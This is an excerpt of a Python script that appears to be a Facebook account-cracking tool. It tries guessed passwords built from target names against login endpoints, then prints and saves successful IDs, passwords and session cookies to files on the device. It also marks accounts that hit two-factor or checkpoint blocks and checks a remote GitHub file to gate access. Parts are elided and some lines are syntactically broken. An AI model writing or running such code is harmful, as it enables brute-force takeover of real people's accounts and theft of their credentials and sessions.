...
version = str(vers)
#-------------------------------#
#os.system('xdg-open https://www.facebook.com/yarian.hasan.71')
logo = (f"""
  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
 /$$__  $$| $$  /$$/ /$$__  $$ /$$__  $$| $$  | $$
| $$  \ $$| $$ /$$/ | $$  \ $$| $$  \__/| $$  | $$
...
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    : Akash          
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  :  A　K　A　S　H　ツ
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    : Akash           {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/MORSHED-404/FBBD/main/ON-OFF.txt').text    
    if id in httpCaht:
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bakash}[{G}AKASH-M2{bblack}]-[{G}%s{bblack}]-[{G}OK:%s{bblack}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bakash}[{G}AKASH-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/AKASH-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[AKASH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[AKASH-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bakash}[{G}AKASH-M1{bakash}]-[{G}%s{bakash}]-[{G}OK:%s{bakas}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bakash[{G}AKASH-OK{bakash}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bakash}[{G}•{bakash}]{G} '+kuki+'')
                linex()
                open('/sdcard/AKASH-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
